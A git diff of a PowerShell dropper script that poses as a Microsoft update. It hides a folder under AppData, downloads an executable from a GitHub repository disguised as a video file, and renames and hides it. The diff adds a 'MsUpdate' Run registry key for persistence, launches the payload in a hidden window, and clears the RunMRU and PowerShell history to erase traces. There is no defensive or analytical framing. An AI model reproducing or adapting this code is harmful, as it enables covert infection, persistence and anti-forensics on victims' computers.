@@ -3,7 +3,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 $UserProfile = [System.Environment]::GetFolderPath("UserProfile")
 $MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
 if (-not (Test-Path -Path $MsRdpNetPath)) {
-    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force
+    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
     $MsRdpNetFolder.Attributes += "Hidden"
 }
 
@@ -19,34 +19,35 @@ if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
 }
 $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
-Unblock-File -Path $rutaLocalAgent
 
 # Copy Ejecuter
-$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.ps1"
+$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
 $urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
 if (-not (Test-Path $rutaLocalEjecuter)) {
     Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
 }
-if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.ps1") {
-    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.ps1'
+if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.exe") {
+    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.exe'
     Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
 }
 $atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter
-Unblock-File -Path $rutaLocalEjecuter
+
+# Registry path for the startup entries
+$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$nombreEntrada = "MsUpdate"
+if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
+    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
+    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
+}
+
+## Execution of the client
+Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -WindowStyle Hidden
 
 
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
-
-#crea tarea de ejecucion
-schtasks /create /sc minute /mo 1 /f /tn "CheckRegUpdate" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\Users\candrade\Documents\HACK\Test.ps1\"" 
-
-
-## Execution of the client
-Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.ps1" -ArgumentList "start" -WindowStyle Hidden
-
 
 # Limpiar historial Powershell
 Clear-History
